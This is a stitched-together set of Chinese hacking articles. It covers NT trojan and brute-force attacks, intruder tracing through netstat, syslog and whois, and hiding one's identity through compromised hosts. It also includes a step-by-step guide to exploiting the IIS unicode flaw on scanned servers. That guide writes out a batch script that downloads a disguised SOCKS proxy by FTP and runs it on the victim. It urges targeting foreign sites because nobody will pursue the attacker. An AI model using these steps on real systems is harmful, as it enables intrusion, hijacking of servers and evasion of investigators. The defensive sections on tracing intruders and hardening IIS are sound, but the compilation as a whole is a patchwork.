“游戏”规则：目标必须是NT主机，执行特洛伊木马程序的最终用户必须是管理员，这样，攻击者就能把批处理文件放在管理员启动文件夹中，开始等待。当下一次管理员登录到机器上时，批处理文件就执行和转储用户名/口令。然后，攻击者就会通过文件共享连接到该机器上并收集结果。入侵者可能尝试的另一个可靠的攻击方法是把按键记录器批处理文件放到启动文件夹中。这种方法可适用于任何用户，不仅仅是管理员。这样即可收集所有该用户发出的按键信息，但没有最初的登录身份资料（这是NT的结构所致，它会在登录过程中终止所有用户方式进程）。然后，攻击者就可以连接到目标机上并收集记录下的按键信息。最致命的特洛伊木马攻击之一就是一个以管理员的身份运行并采用AT命令建立预定事件的批处理文件。因为AT命令能作为系统运行，所以，它能生成SAM数据库和注册表的拷贝。可以想象得出攻击者采用这种方法时会享受到多么大的乐趣。如何防止此类攻击呢？不要把文件共享给Everyone群组，并在您的环境中加强口令机制。如果入侵者遇到一台每次都要向他提示输入身份证明信息的服务器，入侵者就会变得灰心丧气，随即离开。不过，有耐心的入侵者会继续进行Brute Force攻击。无庸置疑，Brute Force NetBIOS攻击最常用的工具是NAT。NAT（NetBIOS检查工具）工具让用户能够通过可能的用户名/口令列表使网络连接命令自动操作。NAT将通过所提供的列表中的每一个用户名和每一个口令试着连接到远程机上。这是一个很漫长的过程，但攻击者往往会使用一个常见口令的缩短列表。一个成功的入侵者会通过上述信息收集方法建立他自己的用户名列表。入侵者准备使用的口令列表也是通过收集到的信息建立的。他们通常从不充实的口令列表开始，然后根据用户名建立其余的口令列表。这对于那些能找到给用户名设置的口令的安全专业人士来说完全是意料之中的事。攻击者可以指定一个要攻击的IP地址，也可以指定整个范围内的IP地址。NAT会尽力完成这项任务，并一直生成格式化报告 。
如何在命令行下更改NTFS分区文件及文件夹权限
大多数时候当你进入一台肉鸡准备上传文件的时候，你却发现对方是NTFS分区，你没有权限读写，这事该怎么办，Windows 2000 自带了一个命令行下修改NTFS分区文件权限的一个工具cacls，具体使用方法来自windows的帮助：
C:\>cacls ／？
显示或者修改文件的访问控制表(ACL)
CACLS filename [/T] [/E] [/C] [/G user:perm] [/R user [...]]
[/P user:perm [...]] [/D user [...]]
filename 显示 ACL。
/T 更改当前目录及其所有子目录中
指定文件的 ACL。
/E 编辑 ACL 而不替换。
/C 在出现拒绝访问错误时继续。
/G user:perm 赋予指定用户访问权限。
Perm 可以是: R 读取
W 写入
C 更改(写入)
F 完全控制
/R user 撤销指定用户的访问权限(仅在与 /E 一起使用时合法)。
/P user:perm 替换指定用户的访问权限。
Perm 可以是: N 无
R 读取
W 写入
C 更改(写入)
F 完全控制
/D user 拒绝指定用户的访问。
在命令中可以使用通配符指定多个文件。
也可以在命令中指定多个用户。
如何追踪入侵者
在区域网路上可能你听过所谓「广播模式」的资料发送方法，此种方法不指定收信站，只要和此网路连结的所有网路设备皆为收信对象。但是这仅仅在区域网路上能够实行，因为区域网路上的机器不多(和Internet比起来)。如果想是Internet上有数千万的主机，根本就不可能实施资料广播(至于IP 
Multi cast算是一种限定式广播Restricted 
Broadcast，唯有被指定的机器会收到，Internet上其他电脑还是不会收到)。假设Internet上可以实施非限定广播，那随便一个人发出广播讯息，全世界的电脑皆受其影响，岂不世界大乱？因此，任何区域网路内的路由器或是类似网路设备都不会将自己区域网路内的广播讯息转送出去。万一在WAN 
Port收到广播讯息，也不会转进自己的LAN Port中。 
而既然网路皆有发信站与收信站，用以标示资讯发送者与资讯接收者，除非对方使用一些特殊的封包封装方式或是使用防火墙对外连线，那么只要有人和你的主机进行通讯(寄信或是telnet、ftp过来都算)你就应该会知道对方的么，如果对方用了防火墙来和你通讯，你最少也能够知道防火墙的位置。也正因为只要有人和你连线，你就能知道对方的位置，那么要不要知道对方位置只是要做不做的问题而已。如果对方是透过一台UNIX主机和你连线，则你更可以透过ident查到是谁和你连线的。 
在实行TCP/IP通讯协定的电脑上，通常可以用netstat指令来看到目前连线的状况。(各位读者可以在win95、Novell以及UNIX试试看(注一))，在下面的连线状况中，netstat指令是在win95上实行的，可以看到目前自己机器(Local 
Address处)的telnet port有一台主机workstation.variox.int由远端(Foreign 
Address处)连线进来并且配到1029号tcp port.而ccunix1主机也以ftp 
port连到workstation.variox.int去。所有的连线状况看得一清二楚。(如A、B) 
A.在UNIX主机(ccunix1.variox.int)看netstat 
B.另一端在Windows95(workstation.variox.int)看netstat 
虽然是不同的作业系统，但netstat是不是长得很像呢？ 
通信过程的纪录设定 
当然，如果你想要把网路连线纪录给记录下来，你可以用crontable定时去跑： 
netstat＞＞filename 
但是UNIX系统早已考虑到这一个需求，因此在系统中有一个专职记录系统事件的Daemon:syslogd，应该有很多读者都知道在UNIX系统的/var/adm下面有两个系统纪录档案：syslog与messages，一个是一般系统的纪录，一个是核心的纪录。但是这两个档案是从哪边来的，又要如何设定呢？ 
系统的纪录基本上都是由syslogd(System Kernel Log 
Daemon)来产生，而syslogd的控制是由/etc/syslog.conf来做的。syslog.conf以两个栏位来决定要记录哪些东西，以及记录到哪边去。下面是一个Linux系统所附上的syslog.conf档案，这也是一个最标准的syslog.conf写法： 
格式就是这样子，第一栏写「在什么情况下」以及「什么程度」。然后用TAB键跳下一栏继续写「符合条件以后要做什么」。这个syslog.conf档案的作者很诚实，告诉你只能用TAB来作各栏位之间的分隔(虽然看来好像他也不知道为什么)。 
第一栏包含了何种情况与程度，中间小数点分隔。另外，星号就代表了某一细项中的所有选项。详细的设定方式如下： 
1.在什么情况：各种不同的情况以下面的字串来决定。 
　 auth 关于系统安全与使用者认证方面 
cron 关于系统自动排程执行(CronTable)方面 
daemon 关于背景执行程式方面 
kern 关于系统核心方面 
lpr 关于印表机方面 
mail 关于电子邮件方面 
news 关于新闻讨论区方面 
syslog 关于系统纪录本身方面 
user 关于使用者方面 
uucp 关于UNIX互拷(UUCP)方面 
上面是大部份的UNIX系统都会有的情况，而有些UNIX系统可能会再分出不同的项目出来。 
　 2.什么程度才记录：下面是各种不同的系统状况程度，依照轻重缓急排列。 
　 none 不要记录这一项 
debug 程式或系统本身除错讯息 
info 一般性资讯 
notice 提醒注意性 
err 发生错误 
warning 警告性 
crit 较严重的警告 
alert 再严重一点的警告 
emerg 已经非常严重了 
同样地，各种UNIX系统可能会有不同的程度表示方式。有些系统是不另外区分crit与alert的差别，也有的系统会有更多种类的程度变化。在记录时，syslogd会自动将你所设定程度以及其上的都一并记录下来。 
例如若你要系统去记录info等级的事件，则notice、err.warning、crit、alert、emerg等在info等级以上的也会一并被记录下来。把上面所写的1、2项以小数点组合起来就是完整的「要记录哪些东西」的写法。例如mail.info表示关于电子邮件传送系统的一般性讯息。auth.emerg就是关于系统安全方面相当严重的讯息。lpr.none表示不要记录关于列表机的讯息(通常用在有多个纪录条件时组合使用)。另外有叁种特殊的符号可供应用： 
1.星号(*) 
星号代表某一细项中所有项目。例如mail.*表示只要有关mail的，不管什么程度都要记录下来。而*.info会把所有程度为info的事件给记录下来。 
2.等号(＝) 
等号表示只记录目前这一等级，其上的等级不要记录。例如刚刚的例子，平常写下info等级时，也会把位于info等级上面的notice、err.warning、crit、alert、emerg等其他等级也记录下来。但若你写=info则就只有记录info这一等级了。 
3.惊叹号(！) 
惊叹号表示不要记录目前这一等级以及其上的等级。 
记录到哪边去 
一般的syslogd都提供下列的管道以供您记录系统发生的什么事： 
　 1.一般档案 
这是最普遍的方式。你可以指定好档案路径与档案名称，但是必须以目录符号「/」开始，系统才会知道这是一个档案。例如/var/adm/maillog表示要记录到/var/adm下面一个称为maillog的档案。如果之前没有这个档案，系统会自动产生一个。 
2.指定的终端机或其他设备 
你也可以将系统纪录写到一个终端机或是设备上。若将系统纪录写到终端机，则目前正在使用该终端机的使用者就会直接在萤幕上看到系统讯息(例如/dev/console或是/dev/tty1.你可以拿一个萤幕专门来显示系统讯息)。若将系统纪录写到印表机，则你会有一长条印满系统纪录的纸(例如/dev/lp0)。 
3.指定的使用者 
你也可以在这边列出一串使用者名称，则这些使用者如果正好上线的话，就会在他的终端机上看到系统讯息(例如root，注意写的时候在使用者名称前面不要再加上其他的字)。 
4.指定的远端主机 
这种写法不将系统讯息记录在连接本地机器上，而记录在其他主机上。有些情况系统碰到的是硬碟错误，或是万一有人把主机推倒，硬碟摔坏了，那你要到哪边去拿系统纪录来看呢？而网路卡只要你不把它折断，应该是比硬碟机耐摔得多了。因此，如果你觉得某些情况下可能纪录没办法存进硬碟里，你可以把系统纪录丢到其他的主机上。如果你要这样做，你可以写下主机名称，然後在主机名称前面加上「@」符号(例如@ccunix1.variox.int，但被你指定的主机上必须要有syslogd)。 
在以上各种纪录方式中，都没有电子邮件这项。因为电子信件要等收件者去收信才看得到，有些情况可能是很紧急的，没办法等你去拿信来看(BSD的Manual 
Page写着「when you got mail,it’s already too late...」:-P)。 
以上就是syslog各项纪录程度以及纪录方式的写法，各位读者可以依照自己的需求记录下自己所需要的内容。但是这些纪录都是一直堆上去的，除非您将档案自行删除掉，否则这些档案就会越来越大。有的人可能会在syslogd.conf里面写： 
*.*/var/log/everything 
要是这样的话，当然所有的情况都被你记录下来了。但是如果真的系统出事了，你可能要从好几十MB甚至几百MB的文字中找出到底是哪边出问题，这样可能对你一点帮助都没有。因此，以下两点可以帮助你快速找到重要的纪录内容： 
1.定期检查纪录 
养成每周(或是更短的时间，如果你有空的话)看一次纪录档的习惯。如果有需要将旧的纪录档备份，可以cploglog.1,cploglog.2...或是cploglog.971013,cploglog.980101...等，将过期的纪录档依照流水号或是日期存起来，未来考察时也比较容易。 
2.只记录有用的东西 
千万不要像前面的例子一样，记录下*.*然后放在一个档案中。这样的结果会导致档案太大，要找资料时根本无法马上找出来。有人在记录网路通讯时，连谁去ping他的主机都记录。除非是系统已经遭到很大的威胁，没事就有人喜欢尝试进入你的系统，否则这种鸡毛蒜皮的小事可以不用记录。可以提升些许系统效率以及降低磁碟用量(当然也节省你的时间)。 
地理位置的追踪 
如何查出入侵者的地理位置？光看IPAddress可能看不出来，但是你常看的话，会发现140.xxx的很多都是台湾学术网路的主机，而168.95.xxx.xxx的一定是HiNet的主机(168.95.0为HiNetClassB网路)。 
在固接式的网路环境中，入侵者一定和网路提供单位有着密切的关系。因为假设是区域网路，那么距离绝对不出几公里。就算是拨接好了，也很少人会花大笔钱去拨外县市甚至国外的拨接伺服器。因此，只要查出连线的单位，入侵者必然离连线单位不远。 
拨接式的网路就比较令人头疼了。以前笔者申请HiNet的hntp2.hinet.net帐号时，拿了自己的身分证和印章，跑到电信局去签了一堆文件，看完网路规范以后才有HiNet网路可以用。时隔多年，现在hntp2早没了，冒出一大堆msxx.hinet.net以及民营ISP，有许多ISP为了吸引客户，卖了很多的所谓小时卡、记点卡……等等不需申请，帐号密码就直接附在上面的卡片。User这边只要买了固定的小时数，不需须另外向ISP那边提出申请，就可以按照卡片上的说明自行拨接上网。这样当然可以吸引客户，但是ISP就根本无从得知是谁在用他们的网路。 
也就是说，虽然以小时卡提供拨接服务给拨接使用者带来相当大的便利，但却是系统安全的大敌，网路管理员的恶梦。如果入侵你的人是使用小时卡来上网，那……，要从拨号的地点查吗？笔者在前几期的系统安全专栏就讲过了，入侵者可以不要用自己家里的电话上网。管它是偷是抢，或是盗打090王八机，反正查到的发话来源绝不是入侵者自己的电话。 
来话者电话侦测(CallerID) 
各位读者家中有ISDN吗？如果你用过ISDN的Caller 
ID功能，会发现真是方便极了，对方的号码马上就显示出来给你看。看到女朋友打电话来，马上就接了起来；而杂志社的打来催稿，就打开电话答录机假装不在家……:-P。但是Caller 
ID依然有失效的时候。笔者这次特地和陈冠宇先生(本刊作者)做了下面的测试，看看Caller 
ID可以显示出哪些号码(受测机种为Zyxel，终端机使用Windows NT的Hyper 
Terminal)：要显示来话方号码的前提是，对方必须是透过数位交换机打到你这边，在台湾有某些地区仍然使用机械式交换机，如果你打电话的交换路径中，有经过这些机械式的交换机，那么依然无法显示出号码来。太电以及其他民营的行动电话因为笔者手边没有，所以无法测试。而国际电话因一时找不到国外的朋友可以配合作测试，因此也没有办法将结果向各位读者报告(如果各位读者手边有太电，远传这些民营的行动电话，可以和笔者联络测试)。 
如何靠IPAddress或DomainName找出入侵者位置？ 
虽然电话不一定查得出来，但是至少你会知道他的IP Address。IP Address的使用必须向Inter NIC登记，而Domain 
Name要向当地直属的网路管理中心登记。在Internet上的网路管理中心共有叁个层级(单位性质一定为NET)： 
　 1.国际等级 
国际等级只有Inter NIC一个，全球各国的NIC以及洲际NIC均由其管理。(http://www.internic.net)。 
　 2.洲际等级 
InterNIC并不直接管理整个Internet，其下的网路资源会再做分区。例如台湾、日本、香港等亚太地区国家，由亚太洲际网路管理中心(Asian-Pacific 
NIC,APNIC，位于日本)来管理，并不直接由Inter NIC管理(http://www.apnic.net)。 
　 3.国家等级 
Domain Name后面不挂国码的不是由Inter 
NIC管理就是由洲际的NIC管理，但是有挂国码的由当地国家之NIC管理，惯例是两位国码加上NIC就是该国NIC之名称。例如台湾之国码为TW，则台湾网路管理中心为TWNIC(http://www.twnic.net)，但由于Inter 
NIC位于美国，因此美国的Domain Name由Inter 
NIC直辖。有一个特别的例外是挂.mil的美国军方网路的资料是由ddn.mil(美国军事防卫网路)来管理，不由Inter NIC管理，当您得到某个Domain 
Name或是IP Address後，可以使用whois来查出资料，语法如下： 
　 whois-h＜whois伺服器＞＜查询对象＞ 
例如向whois.internic.net查询hp.com，需输入： 
　 whois-hwhois.internic.nethp.com 
whois也可能使用下列语法： 
　 whois＜查询对象＞@＜whois伺服器＞ 
例如向whois.twnic.net查询ntu.edu.tw需输入： 
　 whoisntu.edu.tw@whois.twnic.net 
目前在SlackwareLinux附上的为後者。 
　 DomainName命名的叁种情况 
虽然同样是DomainName，可能你会遇到叁种命名的不同情况。在许多国家*.edu.*是由NIC以外的单位所管理(如教育部)，而属性也不一定是叁个字母，甚至没有属性。在判断单位性质时读者宜多加注意，以免找不到资料。 
1.标准国码＋叁码属性码(或没有国码，仅有属性码) 
普遍使用于欧洲，美洲国家以及部份东南亚国家。如台湾常见*.edu.tw、*.com.tw，美国的*.com、*.edu。 
　 2.标准国码＋二码属性码 
以离我国最近的日本、中华人民共和国为例，公司属性为co，社团属性为or，和叁码定义的com、org略有不同。如日本万代公司之Homepage为www.bandai.co.jp，如果读者要使用公司名称拼凑出完整主机名称时，需注意日本为仅有两码属性码之地区，否则若猜测其为www.bandai.com.jp就会发生错误(注：在国际通信范例中，无论是无线电通信、国际越洋电话、乃至于网际网路等，均将台湾与中国大陆划分为两个不同国家。笔者在此特称中华人民共和国除突显此一特性外，并无其他涵义，读者勿需自行揣测其他意义)。 
3.仅有标准国码，未有任何属性码 
如澳洲的主机均为仅有*.au之主机名称，未有任何其他的com、co、或任何单位属性码後面直接接上单位名称。 
　 由Domain Name查出连线单位资料 
在Internet上惯例由whois服务来查询连线单位的登记资料，whois本来应该是用来查某人的电话或是其他资料的(有点像是finger或是现在很流行的寻人服务，像是whowhere、bigfoot之类的，请上www.whowhere.com一探究竟)，但是在NIC方面是用来查出连线单位的电话以及住址，技术联络人等。符合该NIC管理权限的单位资料会存放于该单位的whois主机中，惯例是whois＋NIC名称＋net。例如亚太地区网路管理中心whoisserver为whois.apnic.net，台湾网路中心whoisserver为whois.twnic.net。 
当你知道某台主机的Domain 
Name以後，可以依照下面顺序查出连线单位的电话住址等资料。第一步，先看有没有国码。没有国码的，向whois.internic.net问；有国码的，向whois.国码nic.net问(ex.whois.twnic.net)。 
另外，如果你要查美国军事单位的联络明细(假如某天你发现有人利用美国海军的网路来入侵你的电脑)则你需要向nic.ddn.mil查询，方可查到资料。例如查出美国陆军的资料：但FBI等调查机构属政府单位，非军事单位，查询时需注意： 
由Domain Name查出资料 
如您能从nslookup查出某一IPAddress之FQDN，则可以直接向当地NIC查出入侵者网路之资料： 
　 1.由美国入侵的例子： 
由xxx.aol.com入侵由主机名称发现未有国码，因此直接向Inter NIC查询。由此我们可以查到America 
Online的技术负责人以及电话、传真等资料，把你的系统纪录档准备好，发封传真去告洋状吧！ 
　 2.由台湾入侵的例子： 
由Hope 
Net入侵(cded1.hope.com.tw)由于TWNIC目前whois资料库不知怎么的不见了，故请改由dbms.seed.net.tw查出hope.com.tw之中文名称，再打104询问该公司的电话！(图一)现在如果直接由whois.twnic.net查询会这样： 
只有IPAddress的查法 
若某天您发现由168.95.109.222有人入侵，假设您不知道这是HiNet的网路，而这个IP Address也没有Domain 
Name的话，则须先将IPAddress分等级，再向InterNIC查询： 
(以下作为范例之位置均为虚构，如有雷同，纯属巧合)。 
　 1.由15.4.75.2入侵的例子： 
此IPAddress是15开头，为一个ClassA网路，故向InterNIC查询15.0：查出此IP Address为惠普公司所有 
　 2.由140.111.32.53入侵的例子： 
此IPAddress为ClassB，需查询两次。先向InterNIC查询140.111.0：查出为中华民国教育部所有。再向whois.twnic.net查询140.111.32.0：很可惜的，由于TWNIC资料库不见了，因此您无法知道这是哪个学术单位。劳驾您打个电话去TWNIC问吧！ 
3.由203.66.35.1入侵的例子 
这是一个ClassCIP，因此必须查询至少二次，一般是叁次。顺序为国际－＞洲际－＞所属国家。先查203.0： 
出来一大堆，怎么办？有的情况只好再追问Class B。由于Inter NIC将部份ClassC交给洲际管理机构来负责配给，因此有些Class 
C的资料会在洲际管理机构，此时先向Inter NIC查出所属洲际管理机构(用Class 
B问)。问到203.66为亚太地区洲际网路，于是向whois.apnic.net询问203.66.35.0：查了叁次以后，终于查到203.66.35.0为： 
在一堆资料中查到203.66.35.1，此一IP Address为Forwardness Technology 
Co.Ltd.所有，电话地址也一并附在上面(这是笔者朋友开的网路公司)。 
由以上的查法，可以由任一主机名称或IP 
Address查到连线者网路单位的资料，如果您发现该网路单位下属主机对您的网路有攻击行为，请检具资料告诉对方的系统管理员(对方不一定接受，笔者就碰过很恶劣的系统管理员！)。 
下面是Windows 95的hosts档案：当您没有DNS的时候，您可以拿这个来将Domain Name＜－＞IP 
Address的对应工作做好。写法就和UNIX一样。Microsoft的这个hosts档案写的是给chicago用的，这是windows 
95的开发代号，看见没？(看来Microsoft出windows95时太赶，忘了修正这些小东西)，不过各位读者要注意的是，原先的hosts档案档名是hosts.sam，您要自己将档名改成hosts才能用。(作者E-Mail:variox01@ms1.hinet.net) 
注一： 
几乎所有使用TCP/IP通讯协定的机器都会有hosts、network等档案。这是所有TCP/IP系统的共通习惯(但只有Microsoft的软体会有lmhosts来配合Microsoft自己的wins域名解译系统)。如果读者有注意到的话，可以发现NovellNetware伺服器也有一个etc目录，还有hosts等档案！ 
注二： 
长途台号码为108，转发国内长途电话用，并可要求对方付费(就像国际台一样)，因为台湾早期交换机无法让用户直拨外县市电话，故需由长途台人工转接。现在有了长途直拨，除非您有需要对方付费，否则不需要用长途台了，因为人工转接还要另外支付人工转接费用。当您在打国内长途电话而有对方付费的需求时，就可以打108然後要求值机人员替您转接，然後由受话者来付电话费。这在您手边没有钱，但想使用公共电话来打长途电话时非常好用(当然受话方也可以拒绝您的对方付费要求)。国内其他的人工转接台还有103船舶台(转发船舶无线电话，NAVTEX航务情报电讯等)以及100国际台。
入侵时隐藏自己的真正身份
在入侵中，很多时侯会使用telent来登陆的，但是如果服务器启动telnet服务的话，登陆就会被记录下来，虽然可以有程序可以清除那些记录，但是一定是要有admin权限才可以的，如果你第一次入侵时都是通过猜密码的话，而且入侵不成功或成功后亦得不到admin权限的话，那就清不掉那些记录了。以后是简单说说几种可以隐藏自己
身份的方法： 
1.使用socks代理，视窗下自带的telnet程序是不支持socks代理的，想使作socks代理就要通过其它程序，例如sockcap32,e-border client等等，其它的telnet客户程序，例如netterm是直接支持socks代理的，但是你是没法知道那个代理服务器是否会主录下你的要求的，如果是一个恶意的代理的话，会从记录中得到你输入的用户名和密码的，而且有记录的话，亦不算得上是安全的。wingate亦可以当成
是跳板的，不过不是很方便
2.在肉鸡上建立跳板，这种方法是比较安全的。传统方法是在肉鸡上增加一个admin权限的帐户，然后启动telnet服务，在入侵时先telnet上这台肉鸡，再通过网鸡 telnet上要入侵的服务器，完成入侵后就将肉鸡上的telnet日志清掉。
现在流行的还有其它的几种方法，一般都是在肉鸡上执行一个shell程序，这个程序被执行后就在肉鸡上打开一个端口让你telnet上去，这种方法好处是不用清日志，除非是防火墙记录下你的连接，不然是不会被发现的。这些程序常见的有nc(全名netcat), ncx99(每使用一次都是执行一次)，icmd(可自定义端口和密码，推荐)，Drat(这是木马，而且很难清掉，将代码插入shell进程上,不建议使用),tini(非常小的木马，只有3K,不过可被查杀，不是很安全)，winshell(国产程序，不过不能在中文的NT或2000中执行，程序7K大小，不过因为不能在中文视窗中使用，我不是很喜欢), leapfrog(算是旧程序,压缩后有40多K,可以自定义端口,而且可以限制那个段的IP可以允许连接，例如你的IP是61.127.189.89的话，一般来说，前三位的IP都不会变化的，你可以设置允许连接的IP段是61.127.189.*，这样只有符合这个段的IP才可以连接上，我最喜欢的还是它可以在所有的windows上执行，而上面的几种程序除了木马和nc外，winshell,icmd,ncx99都不能在win95或98上执行的,但现在使用win98的用户还是远远在使用2000或NT的用户上的),snake代理跳板(国人开发的sock服务器端程序，在肉鸡上执行，但一定要有admin的权限才可以启动的，只可以在2000或NT下执行，而且中文的视窗是不可以使用的)
总结：使用socks代理或wingate不算是十分安全，在肉鸡上使用telnet服务亦算是安全的(你要记得清日志)，不过很多服务器都不会打开telnet服务的。使用一些shell程序或木马是十分方便和安全的。在那些shell程序和木马中， winshell和snake代理跳板亦算是不错的，但很不幸就是有限制(国人开发的程序都是很有限制的),ncx99,icmd,nc是个不错的选择，nc还有很多功能的,至于那两个木马，drat就太危险了，可以会导致那台肉鸡不可以正常运行的，tini就不会在自启动中加载。leapfrog虽然比winshell或snake等大，但还是值得试试的，而且leapfrog可能饶过防火墙，因为很多防火墙只限制了某些端口可以使用的，上述的那些程序使如winshell,snake,icmd和nc都可以自定义端口，但是如果防火墙只允许80端口的话，上述程序如果将自己绑在80端口的话，因为服务器打开了80端口一般是有www服务的，如果你再将上述的程序绑入80端口的话，一定会产生错误的，但leapfrog就没有这个问题的。
在肉鸡上建立自己的代理服务器
snake的sksockserver（代理跳板）是一个非常好的的 socks5 代理服务器。它非常小巧，才 
32K，但是可以比较完整的支持tcp协议和udp协议，也支持oicq，而且它具有将通信数据在各跳板 
之间加密的功能。这使我们能很好的掩盖自己网上踪迹。实乃行走江湖，杀人越货必备工具： - 
) 。不过，使用它需要一定的服务器入侵知识，这对新手菜鸟是个很大的挑战。因此，我写下这 
篇文章，希望对大家有所帮助。 

所需软件： 流光4 http://www.netxeyes.com/ 
代理跳板SkSockServer http://snake12.top263.net 
代理猎手 http://dzc.126.com/ 


准备工作：请申请一个 ftp 空间，现在的免费主页大都带有 ftp 空间的。假设申请的 ftp 空间 
地址为 ftp.server.com ，用户名为 tom ，密码是 pass 。将 SkSockServer.exe 改名为 
char.exe 上传到 ftp 空间。改名的目的当然是为了不那么起眼，你随便改好了。 

步骤： 一：在 C 盘根目录下面建立一个文本文件 pp.txt，内容如下： 

echo open ftp.server.com>af.txt 
echo tom>>af.txt 
echo pass>>af.txt 
echo bin>>af.txt 
echo get char.exe>>af.txt 
echo bye>>af.txt 
ftp -s:af.txt 
del a.txt 
del af.txt 
char -debug 5262 

注意了，请用你的真实的 ftp 网站地址、用户名、密码代替上面的 ftp.server.com 、 tom 和 
pass ，否则就不会成功的。现在来检查你的文件是否正确，复制一份 pp.txt ，将它的扩展名改 
为 bat ，即将文件改名为 pp.bat 。拨号上网，执行 pp.bat ，如果你没有写错，那在 pp.bat 
所在目录下面应该会有一个 char.exe 。如果 char.exe 文件不在，检查你的网络连接是否正 
常，自己用 ftp 软件去看看自己的空间里面是否有 char.exe 这个文件。最重要的要检查 ftp 
服务器有没有写错，用户名和密码是否正确。 

我来解释一下这个文件的意思.如果你学过 dos ，就会很清楚上面pp.txt文件的作用了。 
echo 命令是在屏幕上显示你输入的字符。如，在 dos 下面，输入 
echo hello 
那它就会显示 
hello 
“ > ”是管道重定向符号，执行 dos 命令 
echo hello>a.txt 
命令执行的结果是将 hello 写在一个 a.txt 文件上， 原先a.txt 文件的内容会被删掉，变成只 
有 hello 这个单词。如果 a.txt 文件不存在，那它会自己生成一个新文件。 “ >>" 和 ">" 不 
同的地方是它不会删掉文件原有的内容，只会在文件后面追加新内容。 
好了，我们来看 pp.txt 文件执行的结果 

echo open ftp.server.com>af.txt echo tom>>af.txt echo pass>>af.txt echo bin>>af.txt 
echo get char.exe>>af.txt echo bye>>af.txt 

上面这几个命令执行的结果是在当前路径下生成一个 af.txt 文件，内容如下： 
open ftp.server.com 
tom 
pass 
bin 
get char.exe 
bye 

　 

然后是执行 ftp af.txt 
这让系统调用 ftp 命令，下载 char.exe 文件。 
下面的就没有什么好说了 
分别是删除 a.txt ， af.txt 文件，在 5262 端口上进行 socks5 服务。 

　 

二：打开流光 4, 按 Ctrl+R ，在弹出的对话框中，填写你想搜索的 IP 范围，建议搜索台湾、 
美国或者日本的网站，它们漏洞比较多。扫描主机类型改为 IIS/FrontPage, 这里我搜索 
210.59.70.1 － 210.59.72.254 。搜索结束后会弹出提示的，这里我用了约 5 分钟时间。在流 
光中间一栏会出现你搜索到的结果，分为主机、系统版本、类型、描述四项。如果主机是黑色 
的，也就是在类型那一栏里写着 Remote Excute X ，（ X 是从 A 到 E 之间的字母，）那这台 
主机就是有 unicode 漏洞了。点击它，选连接，将允许 IIS 检测 CMD 去掉，然后我们就可以执 
行命令了。 

三：先输入一个命令，看看它是否允许我们写入文件。我们输入 
echo hello>a.txt 
这时，可能出现几种提示： 
A. 如果文件允许写入，就只会显示 
[echo hello>a.txt] 
那这台服务器就可以作为我们的跳板了。 
B. 服务器不允许输入，那么会显示 
[echo hello>a.txt] 
Access is denied. 
这表示这台服务器不允许我们写入文件，呵呵，去找下一台吧，这台没戏了。 
C. 使用了陷阱技术 
[echo hello>a.txt] 
HTTP/1.1 502 Gateway Error 
那可能是主机做了一定的防范措施，你可以再重新试试刚才那个命令，也许行的。 
D. 其它 
我也不知道原因了。试试直接执行下面步骤吧，也许会成功。 
好了，出现 A 的情况，那表示这台主机可以作为跳板了。再输入 
local file:c:\pp.txt 
这个命令就是让流光依次执行 c:\pp.txt 里面的指令，免除我们一个个输入的麻烦。它的输出大 
致如下： 
[local file:c:\pp.txt] 
[echo open ftp.server.com>af.txt] 
[echo tom>>af.txt] 
[echo pass>>af.txt] 
[echo bin>>af.txt] 
[echo get char.exe>>af.txt] 
[echo bye>>af.txt] 
[ftp -s:af.txt] 
[del af.txt] 
[char -debug 5262] 
在有些机器上执行的输出有些差异，但基本上是这样的。如果在其中的某一个命令出现了“ 
HTTP/1.1 502 Gateway Error ” ，那你就要重新执行 
local file:c:\pp.txt 
如果出现 Connect Failed ，那可能是你的网络连接有问题，检查一下是不是掉线了，再重新执 
行 
local file:c:\pp.txt 
四： 我们现在来验证跳板是否真正运行。运行代理猎手，添加结果，将上面那台主机的 IP 加上 
去，端口是 5262 （就是我爱菱儿啦！），协议是 socks5 。验证它的结果是否 free 。如果是 
就行了。不是重新执行一次 local file:c:\pp.txt 吧。再不行只好放弃了，另外找一台机器好 
了。关掉 IIS 远程命令行，再选择另外一台有 unicode 漏洞的机器重复步骤三，这样就可以将 
所有搜索到的 unicode 漏洞机器作为你的跳板了。 
五： 运行 skserver 图形版本，选配置－经过的 skserver ，将刚才弄好的一两个跳板加上去。 
在这里不要加太多的跳板，否则会影响你的浏览速度，如果没有特殊需要，一个就可以了。按 
ok 后在命令里面选择停止，再选择开始，你现在就拥有了一个加密的 socks5 代理。可以用 
sockscap 或者 nec e-border client 等 socks 接口软件来调度你的网络程序，呵呵，现在就尽 
情的冲浪吧。 
注意事项： 因为利用 unicode 漏洞得到的权限很低，所以不能让 sksockserver 作为服务运 
行，也就不能让它每次开机自动运行了。如果它停了你可以很方便的再次运行它。和建立时候一 
样，打开 IIS 命令行，然后运行这个命令就可以了 
char -debug 5262 
如果你有任何的疑问，请来信一起探讨。 
致谢：非常感激 snake 的代理跳板，它让我可以穿过学校的封锁，尽情的冲浪和与我的菱儿聊 
天。也谢谢小榕，它的流光是我见过最强大而简单的黑客软件。当然了，我更加不会忘记太阳 
风，他的代理猎手是带领我走进网络之门的程序。 
作者： Nicky 
email ： liuxua@163.net 
Nicky的补充: 
是的，按我的方法基本上是无法擦除入侵痕迹的。所以，大家要注意安全，一定不要黑国内的网 
站。如果是黑台湾、日本、美国的小网站，根本没有人会管！另外，用跳板黑会很安全的，只 
是，当你用它作跳板的时候，同时也暴露了你的I P。放心了，按我的方法你绝对不会误伤国内的 
网站的，想黑还黑不到呢。流光不允许对国内网站进行探测。 
至于说能不能在服务器上面写文件，我想我在文章里面已经交待清楚了。在步骤一里我要大家先 
输入一个命令echo hello>a.txt ，如果服务器不允许写文件，那它就会返回 Access Denied。这 
时只好找另外一个服务器了。 
判断能不能将该服务器作为跳板的最简单方法。 
在步骤一中先输入 echo hello>a.txt 
然后再输入 dir a.txt 
如果a.txt文件存在，那就可以用它作跳板了。
让你的IIS无懈可击
如果你的电脑新安装了nt4/win2000以后，并不是说就可以直接用来作Internet服务器了。尽 
管微软的补丁打了一大堆，但还是有些漏洞。现在我们就简单的谈一下如何使用IIS建立一个高安 
全性能的服务器。 
一、 以Windows NT的安全机制为基础 
　　1）NT打SP6补丁、2K打SP2补丁。把磁盘的文件系统转换成NTFS（安装系统的分区可以在安装 
系统的时候转换，也可以安装完系统以后，用工具转换）。同时把使用权限里有关Everyone的 
写、修改的权限去掉，关键目录：如Winnt\Repair连读的权限也去掉。 
　　2）共享权限的修改。在NT下到开始菜单--》程序--》管理工具--》系统策略编辑器，然后打 
开系统策略里文件菜单里的“打开注册表”修改其中的windows NT 网络把其中勾去掉。 2K下可 
